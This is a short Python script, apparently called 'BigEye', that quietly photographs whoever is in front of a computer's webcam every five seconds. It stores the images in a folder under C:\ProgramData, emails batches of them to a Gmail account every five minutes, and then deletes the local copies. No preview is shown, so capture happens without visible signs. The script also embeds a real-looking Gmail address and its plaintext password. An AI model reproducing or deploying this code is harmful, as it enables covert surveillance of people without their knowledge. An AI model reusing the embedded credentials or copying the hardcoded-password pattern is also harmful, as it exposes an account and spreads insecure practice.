import cv2#
import time#
import os #
import smtplib, ssl#
import imghdr
from email.message import EmailMessage #



capture = cv2.VideoCapture(0)
capture.set(3, 640)
capture.set(4, 480)
img_counter = 0


sender_email = "bigeye202020@gmail.com"
receiver_email = "bigeye202020@gmail.com"
password = "paparuda007"
directory = r"C:\\ProgramData\\BigEye"
files = []

if os.path.isdir(directory):
    pass
else:
    os.mkdir(directory)

os.chdir(directory)   
frame_set = []
start_time = time.time()
mail_time = time.time()

while True:
    ret, frame = capture.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    msg = EmailMessage()
    msg['Subject'] = 'Test'
    msg['From'] = sender_email
    msg['To']=receiver_email
    msg.set_content('test')
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break
    if time.time() - start_time >= 5: #<---- Check if 5 sec passed
        img_name = "img_{}.png".format(img_counter)
        cv2.imwrite(img_name, frame)
        start_time = time.time()                      
        files.append("img_{}.png".format(img_counter))

        
        img_counter += 1

        if time.time() - mail_time >= 300:
            for file in files:
                with open(file,'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)            
                msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=f.name)

            with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
                smtp.login(sender_email,password)
                smtp.send_message(msg)
            mail_time=time.time()
            for file in files:
                os.remove(file)
            files=[]